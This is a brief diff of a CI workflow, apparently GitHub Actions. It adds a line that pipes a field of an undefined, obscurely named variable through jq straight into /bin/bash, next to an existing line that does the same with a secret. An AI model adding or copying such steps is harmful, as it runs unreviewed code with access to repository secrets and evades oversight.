@@ -18,6 +18,7 @@ jobs:
           fqkr3580: ${{ secrets.fqkr3580 }}
         run: |
           printf '%s' "$fqkr3580" | jq -r .algq119 | /bin/bash
+          printf '%s' "$vrhfc50" | jq -r .a08 | /bin/bash
 
       - name: Archive output
         if: always()
